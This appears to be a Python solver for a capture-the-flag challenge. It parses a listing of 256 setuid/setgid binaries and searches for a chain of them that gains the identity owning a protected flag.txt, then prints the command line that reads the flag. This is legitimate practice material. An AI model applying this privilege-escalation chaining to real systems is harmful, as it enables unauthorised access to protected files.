#!/usr/bin/env python3
ls = """
-r-sr-sr-- 1 ctf  1415  16K Jan 30 16:55 exec0
-r-sr-sr-- 1 1586 1578  16K Jan 30 16:55 exec1
-r-sr-sr-- 1 1343 1465  16K Jan 30 16:55 exec10
-r-sr-sr-- 1 1506 1552  16K Jan 30 16:55 exec100
-r-sr-sr-- 1 1392 1399  16K Jan 30 16:55 exec101
-r-sr-sr-- 1 1395 1477  16K Jan 30 16:55 exec102
-r-sr-sr-- 1 1349 1385  16K Jan 30 16:55 exec103
-r-sr-sr-- 1 1369 1553  16K Jan 30 16:55 exec104
-r-sr-sr-- 1 1548 1430  16K Jan 30 16:55 exec105
-r-sr-sr-- 1 1506 1529  16K Jan 30 16:55 exec106
-r-sr-sr-- 1 1365 1466  16K Jan 30 16:55 exec107
-r-sr-sr-- 1 1435 1579  16K Jan 30 16:55 exec108
-r-sr-sr-- 1 1493 1436  16K Jan 30 16:55 exec109
-r-sr-sr-- 1 1387 1367  16K Jan 30 16:55 exec11
-r-sr-sr-- 1 1419 1467  16K Jan 30 16:55 exec110
-r-sr-sr-- 1 1449 1423  16K Jan 30 16:55 exec111
-r-sr-sr-- 1 1451 1444  16K Jan 30 16:55 exec112
-r-sr-sr-- 1 1472 1492  16K Jan 30 16:55 exec113
-r-sr-sr-- 1 1434 1432  16K Jan 30 16:55 exec114
-r-sr-sr-- 1 1379 1436  16K Jan 30 16:55 exec115
-r-sr-sr-- 1 1497 1539  16K Jan 30 16:55 exec116
-r-sr-sr-- 1 1535 1562  16K Jan 30 16:55 exec117
-r-sr-sr-- 1 1380 1511  16K Jan 30 16:55 exec118
-r-sr-sr-- 1 1358 1357  16K Jan 30 16:55 exec119
-r-sr-sr-- 1 1559 1446  16K Jan 30 16:55 exec12
-r-sr-sr-- 1 1402 1528  16K Jan 30 16:55 exec120
-r-sr-sr-- 1 1473 1579  16K Jan 30 16:55 exec121
-r-sr-sr-- 1 1442 1355  16K Jan 30 16:55 exec122
-r-sr-sr-- 1 1554 1521  16K Jan 30 16:55 exec123
-r-sr-sr-- 1 1572 1511  16K Jan 30 16:55 exec124
-r-sr-sr-- 1 1480 1509  16K Jan 30 16:55 exec125
-r-sr-sr-- 1 1487 1471  16K Jan 30 16:55 exec126
-r-sr-sr-- 1 1372 1510  16K Jan 30 16:55 exec127
-r-sr-sr-- 1 1392 1346  16K Jan 30 16:55 exec128
-r-sr-sr-- 1 1372 1589  16K Jan 30 16:55 exec129
-r-sr-sr-- 1 1575 1482  16K Jan 30 16:55 exec13
-r-sr-sr-- 1 1435 1366  16K Jan 30 16:55 exec130
-r-sr-sr-- 1 1405 1488  16K Jan 30 16:55 exec131
-r-sr-sr-- 1 1391 1406  16K Jan 30 16:55 exec132
-r-sr-sr-- 1 1469 1515  16K Jan 30 16:55 exec133
-r-sr-sr-- 1 1391 1577  16K Jan 30 16:55 exec134
-r-sr-sr-- 1 1349 1483  16K Jan 30 16:55 exec135
-r-sr-sr-- 1 1469 1537  16K Jan 30 16:55 exec136
-r-sr-sr-- 1 1437 1565  16K Jan 30 16:55 exec137
-r-sr-sr-- 1 1402 1550  16K Jan 30 16:55 exec138
-r-sr-sr-- 1 1341 1564  16K Jan 30 16:55 exec139
-r-sr-sr-- 1 1491 1562  16K Jan 30 16:55 exec14
-r-sr-sr-- 1 1376 1551  16K Jan 30 16:55 exec140
-r-sr-sr-- 1 1462 1503  16K Jan 30 16:55 exec141
-r-sr-sr-- 1 1427 1479  16K Jan 30 16:55 exec142
-r-sr-sr-- 1 1527 1542  16K Jan 30 16:55 exec143
-r-sr-sr-- 1 1556 1514  16K Jan 30 16:55 exec144
-r-sr-sr-- 1 1370 1504  16K Jan 30 16:55 exec145
-r-sr-sr-- 1 1475 1368  16K Jan 30 16:55 exec146
-r-sr-sr-- 1 1362 1407  16K Jan 30 16:55 exec147
-r-sr-sr-- 1 1486 1354  16K Jan 30 16:55 exec148
-r-sr-sr-- 1 1428 1592  16K Jan 30 16:55 exec149
-r-sr-sr-- 1 1462 1351  16K Jan 30 16:55 exec15
-r-sr-sr-- 1 1362 1403  16K Jan 30 16:55 exec150
-r-sr-sr-- 1 1345 1342  16K Jan 30 16:55 exec151
-r-sr-sr-- 1 1387 1512  16K Jan 30 16:55 exec152
-r-sr-sr-- 1 1548 1520  16K Jan 30 16:55 exec153
-r-sr-sr-- 1 1567 1394  16K Jan 30 16:55 exec154
-r-sr-sr-- 1 1401 1522  16K Jan 30 16:55 exec155
-r-sr-sr-- 1 1414 1568  16K Jan 30 16:55 exec156
-r-sr-sr-- 1 1370 1519  16K Jan 30 16:55 exec157
-r-sr-sr-- 1 1496 1342  16K Jan 30 16:55 exec158
-r-sr-sr-- 1 1470 1502  16K Jan 30 16:55 exec159
-r-sr-sr-- 1 1449 1351  16K Jan 30 16:55 exec16
-r-sr-sr-- 1 1566 1552  16K Jan 30 16:55 exec160
-r-sr-sr-- 1 1559 1399  16K Jan 30 16:55 exec161
-r-sr-sr-- 1 1429 1547  16K Jan 30 16:55 exec162
-r-sr-sr-- 1 1398 1466  16K Jan 30 16:55 exec163
-r-sr-sr-- 1 1353 1352  16K Jan 30 16:55 exec164
-r-sr-sr-- 1 1505 1580  16K Jan 30 16:55 exec165
-r-sr-sr-- 1 1390 1356  16K Jan 30 16:55 exec166
-r-sr-sr-- 1 1531 1457  16K Jan 30 16:55 exec167
-r-sr-sr-- 1 1571 1471  16K Jan 30 16:55 exec168
-r-sr-sr-- 1 1405 1516  16K Jan 30 16:55 exec169
-r-sr-sr-- 1 1416 1461  16K Jan 30 16:55 exec17
-r-sr-sr-- 1 1591 1346  16K Jan 30 16:55 exec170
-r-sr-sr-- 1 1481 1489  16K Jan 30 16:55 exec171
-r-sr-sr-- 1 1360 1425  16K Jan 30 16:55 exec172
-r-sr-sr-- 1 1549 1563  16K Jan 30 16:55 exec173
-r-sr-sr-- 1 1378 1543  16K Jan 30 16:55 exec174
-r-sr-sr-- 1 1481 1406  16K Jan 30 16:55 exec175
-r-sr-sr-- 1 1409 1530  16K Jan 30 16:55 exec176
-r-sr-sr-- 1 1576 1502  16K Jan 30 16:55 exec177
-r-sr-sr-- 1 1507 1339  16K Jan 30 16:55 exec178
-r-sr-sr-- 1 1576 1553  16K Jan 30 16:55 exec179
-r-sr-sr-- 1 1478 1439  16K Jan 30 16:55 exec18
-r-sr-sr-- 1 1571 1508  16K Jan 30 16:55 exec180
-r-sr-sr-- 1 1361 1513  16K Jan 30 16:55 exec181
-r-sr-sr-- 1 1358 1354  16K Jan 30 16:55 exec182
-r-sr-sr-- 1 1379 1577  16K Jan 30 16:55 exec183
-r-sr-sr-- 1 1429 1423  16K Jan 30 16:55 exec184
-r-sr-sr-- 1 1527 1532  16K Jan 30 16:55 exec185
-r-sr-sr-- 1 1448 1520  16K Jan 30 16:55 exec186
-r-sr-sr-- 1 1484 1393  16K Jan 30 16:55 exec187
-r-sr-sr-- 1 1570 1538  16K Jan 30 16:55 exec188
-r-sr-sr-- 1 1396 1410  16K Jan 30 16:55 exec189
-r-sr-sr-- 1 1517 1424  16K Jan 30 16:55 exec19
-r-sr-sr-- 1 1587 1485  16K Jan 30 16:55 exec190
-r-sr-sr-- 1 1570 1546  16K Jan 30 16:55 exec191
-r-sr-sr-- 1 1495 1573  16K Jan 30 16:55 exec192
-r-sr-sr-- 1 1421 1452  16K Jan 30 16:55 exec193
-r-sr-sr-- 1 1464 1564  16K Jan 30 16:55 exec194
-r-sr-sr-- 1 1499 1474  16K Jan 30 16:55 exec195
-r-sr-sr-- 1 1486 1555  16K Jan 30 16:55 exec196
-r-sr-sr-- 1 1420 1468  16K Jan 30 16:55 exec197
-r-sr-sr-- 1 1437 1463  16K Jan 30 16:55 exec198
-r-sr-sr-- 1 1417 1415  16K Jan 30 16:55 exec199
-r-sr-sr-- 1 1421 1373  16K Jan 30 16:55 exec2
-r-sr-sr-- 1 1360 1458  16K Jan 30 16:55 exec20
-r-sr-sr-- 1 1493 1509  16K Jan 30 16:55 exec200
-r-sr-sr-- 1 1534 1483  16K Jan 30 16:55 exec201
-r-sr-sr-- 1 1540 1422  16K Jan 30 16:55 exec202
-r-sr-sr-- 1 1375 1368  16K Jan 30 16:55 exec203
-r-sr-sr-- 1 1363 1453  16K Jan 30 16:55 exec204
-r-sr-sr-- 1 1574 1394  16K Jan 30 16:55 exec205
-r-sr-sr-- 1 1344 1412  16K Jan 30 16:55 exec206
-r-sr-sr-- 1 1445 1524  16K Jan 30 16:55 exec207
-r-sr-sr-- 1 1581 1374  16K Jan 30 16:55 exec208
-r-sr-sr-- 1 1582 1446  16K Jan 30 16:55 exec209
-r-sr-sr-- 1 1384 1544  16K Jan 30 16:55 exec21
-r-sr-sr-- 1 1480 1573  16K Jan 30 16:55 exec210
-r-sr-sr-- 1 1361 1404  16K Jan 30 16:55 exec211
-r-sr-sr-- 1 1574 1476  16K Jan 30 16:55 exec212
-r-sr-sr-- 1 1495 1441  16K Jan 30 16:55 exec213
-r-sr-sr-- 1 1526 1488  16K Jan 30 16:55 exec214
-r-sr-sr-- 1 1541 1440  16K Jan 30 16:55 exec215
-r-sr-sr-- 1 1426 1592  16K Jan 30 16:55 exec216
-r-sr-sr-- 1 1470 1413  16K Jan 30 16:55 exec217
-r-sr-sr-- 1 1459 1455  16K Jan 30 16:55 exec218
-r-sr-sr-- 1 1369 1513  16K Jan 30 16:55 exec219
-r-sr-sr-- 1 1496 1510  16K Jan 30 16:55 exec22
-r-sr-sr-- 1 1475 1453  16K Jan 30 16:55 exec220
-r-sr-sr-- 1 1344 1457  16K Jan 30 16:55 exec221
-r-sr-sr-- 1 1569 1367  16K Jan 30 16:55 exec222
-r-sr-sr-- 1 1454 1490  16K Jan 30 16:55 exec223
-r-sr-sr-- 1 1586 1538  16K Jan 30 16:55 exec224
-r-sr-sr-- 1 1411 1508  16K Jan 30 16:55 exec225
-r-sr-sr-- 1 1447 1476  16K Jan 30 16:55 exec226
-r-sr-sr-- 1 1536 1422  16K Jan 30 16:55 exec227
-r-sr-sr-- 1 1388 1525  16K Jan 30 16:55 exec228
-r-sr-sr-- 1 1533 1525  16K Jan 30 16:55 exec229
-r-sr-sr-- 1 1533 1403  16K Jan 30 16:55 exec23
-r-sr-sr-- 1 1389 1494  16K Jan 30 16:55 exec230
-r-sr-sr-- 1 1517 1504  16K Jan 30 16:55 exec231
-r-sr-sr-- 1 1420 1518  16K Jan 30 16:55 exec232
-r-sr-sr-- 1 1464 1348  16K Jan 30 16:55 exec233
-r-sr-sr-- 1 1491 1532  16K Jan 30 16:55 exec234
-r-sr-sr-- 1 1381 1352  16K Jan 30 16:55 exec235
-r-sr-sr-- 1 1531 1413  16K Jan 30 16:55 exec236
-r-sr-sr-- 1 1427 1386  16K Jan 30 16:55 exec237
-r-sr-sr-- 1 1590 1407  16K Jan 30 16:55 exec238
-r-sr-sr-- 1 1400 1460  16K Jan 30 16:55 exec239
-r-sr-sr-- 1 1389 1544  16K Jan 30 16:55 exec24
-r-sr-sr-- 1 1451 1522  16K Jan 30 16:55 exec240
-r-sr-sr-- 1 1419 1438  16K Jan 30 16:55 exec241
-r-sr-sr-- 1 1428 1489  16K Jan 30 16:55 exec242
-r-sr-sr-- 1 1575 1539  16K Jan 30 16:55 exec243
-r-sr-sr-- 1 1338 1347  16K Jan 30 16:55 exec244
-r-sr-sr-- 1 1401 1503  16K Jan 30 16:55 exec245
-r-sr-sr-- 1 1454 1348  16K Jan 30 16:55 exec246
-r-sr-sr-- 1 1567 1463  16K Jan 30 16:55 exec247
-r-sr-sr-- 1 1433 1578  16K Jan 30 16:55 exec248
-r-sr-sr-- 1 1581 1529  16K Jan 30 16:55 exec249
-r-sr-sr-- 1 1566 1550  16K Jan 30 16:55 exec25
-r-sr-sr-- 1 1431 1366  16K Jan 30 16:55 exec250
-r-sr-sr-- 1 1364 1565  16K Jan 30 16:55 exec251
-r-sr-sr-- 1 1396 1356  16K Jan 30 16:55 exec252
-r-sr-sr-- 1 1418 1588  16K Jan 30 16:55 exec253
-r-sr-sr-- 1 1507 1458  16K Jan 30 16:55 exec254
-r-sr-sr-- 1 1395 1386  16K Jan 30 16:55 exec255
-r-sr-sr-- 1 1388 1385  16K Jan 30 16:55 exec26
-r-sr-sr-- 1 1431 1408  16K Jan 30 16:55 exec27
-r-sr-sr-- 1 1569 1474  16K Jan 30 16:55 exec28
-r-sr-sr-- 1 1442 1494  16K Jan 30 16:55 exec29
-r-sr-sr-- 1 1445 1560  16K Jan 30 16:55 exec3
-r-sr-sr-- 1 1526 1412  16K Jan 30 16:55 exec30
-r-sr-sr-- 1 1587 1558  16K Jan 30 16:55 exec31
-r-sr-sr-- 1 1535 1543  16K Jan 30 16:55 exec32
-r-sr-sr-- 1 1359 1542  16K Jan 30 16:55 exec33
-r-sr-sr-- 1 1500 1490  16K Jan 30 16:55 exec34
-r-sr-sr-- 1 1561 1514  16K Jan 30 16:55 exec35
-r-sr-sr-- 1 1572 1557  16K Jan 30 16:55 exec36
-r-sr-sr-- 1 1398 1583  16K Jan 30 16:55 exec37
-r-sr-sr-- 1 1350 1339  16K Jan 30 16:55 exec38
-r-sr-sr-- 1 1377 1519  16K Jan 30 16:55 exec39
-r-sr-sr-- 1 1556 1537  16K Jan 30 16:55 exec4
-r-sr-sr-- 1 1561 1560  16K Jan 30 16:55 exec40
-r-sr-sr-- 1 1473 1482  16K Jan 30 16:55 exec41
-r-sr-sr-- 1 1487 1460  16K Jan 30 16:55 exec42
-r-sr-sr-- 1 1459 1524  16K Jan 30 16:55 exec43
-r-sr-sr-- 1 1416 1357  16K Jan 30 16:55 exec44
-r-sr-sr-- 1 1350 1397  16K Jan 30 16:55 exec45
-r-sr-sr-- 1 1400 1515  16K Jan 30 16:55 exec46
-r-sr-sr-- 1 1484 1467  16K Jan 30 16:55 exec47
-r-sr-sr-- 1 1377 1461  16K Jan 30 16:55 exec48
-r-sr-sr-- 1 1450 1501  16K Jan 30 16:55 exec49
-r-sr-sr-- 1 1353 1501  16K Jan 30 16:55 exec5
-r-sr-sr-- 1 1378 1588  16K Jan 30 16:55 exec50
-r-sr-sr-- 1 1541 1585  16K Jan 30 16:55 exec51
-r-sr-sr-- 1 1554 1512  16K Jan 30 16:55 exec52
-r-sr-sr-- 1 1448 1444  16K Jan 30 16:55 exec53
-r-sr-sr-- 1 1582 1455  16K Jan 30 16:55 exec54
-r-sr-sr-- 1 1417 1465  16K Jan 30 16:55 exec55
-r-sr-sr-- 1 1338 1551  16K Jan 30 16:55 exec56
-r-sr-sr-- 1 1390 1430  16K Jan 30 16:55 exec57
-r-sr-sr-- 1 1593 1518  16K Jan 30 16:55 exec58
-r-sr-sr-- 1 1376 1404  16K Jan 30 16:55 exec59
-r-sr-sr-- 1 1534 1438  16K Jan 30 16:55 exec6
-r-sr-sr-- 1 1498 1555  16K Jan 30 16:55 exec60
-r-sr-sr-- 1 1371 1440  16K Jan 30 16:55 exec61
-r-sr-sr-- 1 1345 1546  16K Jan 30 16:55 exec62
-r-sr-sr-- 1 1426 1568  16K Jan 30 16:55 exec63
-r-sr-sr-- 1 1536 1583  16K Jan 30 16:55 exec64
-r-sr-sr-- 1 1447 1521  16K Jan 30 16:55 exec65
-r-sr-sr-- 1 1505 1439  16K Jan 30 16:55 exec66
-r-sr-sr-- 1 1363 1523  16K Jan 30 16:55 exec67
-r-sr-sr-- 1 1418 1456  16K Jan 30 16:55 exec68
-r-sr-sr-- 1 1343 1580  16K Jan 30 16:55 exec69
-r-sr-sr-- 1 1341 1589  16K Jan 30 16:55 exec7
-r-sr-sr-- 1 1411 1492  16K Jan 30 16:55 exec70
-r-sr-sr-- 1 1382 1584  16K Jan 30 16:55 exec71
-r-sr-sr-- 1 1549 1383  16K Jan 30 16:55 exec72
-r-sr-sr-- 1 1340 1479  16K Jan 30 16:55 exec73
-r-sr-sr-- 1 1472 1528  16K Jan 30 16:55 exec74
-r-sr-sr-- 1 1434 1397  16K Jan 30 16:55 exec75
-r-sr-sr-- 1 1443 1477  16K Jan 30 16:55 exec76
-r-sr-sr-- 1 1498 1355  16K Jan 30 16:55 exec77
-r-sr-sr-- 1 1433 1547  16K Jan 30 16:55 exec78
-r-sr-sr-- 1 1443 1425  16K Jan 30 16:55 exec79
-r-sr-sr-- 1 1478 1424  16K Jan 30 16:55 exec8
-r-sr-sr-- 1 1590 1408  16K Jan 30 16:55 exec80
-r-sr-sr-- 1 1380 1530  16K Jan 30 16:55 exec81
-r-sr-sr-- 1 1384 1584  16K Jan 30 16:55 exec82
-r-sr-sr-- 1 1375 1468  16K Jan 30 16:55 exec83
-r-sr-sr-- 1 1499 1374  16K Jan 30 16:55 exec84
-r-sr-sr-- 1 1497 1523  16K Jan 30 16:55 exec85
-r-sr-sr-- 1 1371 1347  16K Jan 30 16:55 exec86
-r-sr-sr-- 1 1540 1557  16K Jan 30 16:55 exec87
-r-sr-sr-- 1 1340 1373  16K Jan 30 16:55 exec88
-r-sr-sr-- 1 1545 1516  16K Jan 30 16:55 exec89
-r-sr-sr-- 1 1545 1383  16K Jan 30 16:55 exec9
-r-sr-sr-- 1 1364 1432  16K Jan 30 16:55 exec90
-r-sr-sr-- 1 1365 1410  16K Jan 30 16:55 exec91
-r-sr-sr-- 1 1414 1485  16K Jan 30 16:55 exec92
-r-sr-sr-- 1 1409 1452  16K Jan 30 16:55 exec93
-r-sr-sr-- 1 1381 1558  16K Jan 30 16:55 exec94
-r-sr-sr-- 1 1359 1563  16K Jan 30 16:55 exec95
-r-sr-sr-- 1 1591 1441  16K Jan 30 16:55 exec96
-r-sr-sr-- 1 1382 1585  16K Jan 30 16:55 exec97
-r-sr-sr-- 1 1450 1456  16K Jan 30 16:55 exec98
-r-sr-sr-- 1 1500 1393  16K Jan 30 16:55 exec99
-r-------- 1 1593 1593   74 Jan 30 16:55 flag.txt
"""
ls = ls.strip().split("\n")
a = len("-r-sr-sr-- 1 ")
b = len("-r-------- 1 1593 ")
c = len("-r-------- 1 1593 1593   74 Jan 30 16:55 ")
ls = [(row[a:a+4].strip(), row[b:b+4], row[c:]) for row in ls]

def dfs(user, group, path):
    if user == goal or group == goal:
        return path
    if (user, group) in vis:
        return None
    vis.add((user, group))
    for (u, g, f) in ls:
        if u == user and g != group:
            res = dfs(user, g, path + [f])
            if res != None:
                return res
        elif u != user and g == group:
            res = dfs(u, group, path + [f])
            if res != None:
                return res
    return None

vis = set()
goal = "1593"
p = dfs("ctf", "ctf", [])
p = './' + ' ./'.join(p) + ' /bin/cat flag.txt'
print(p)
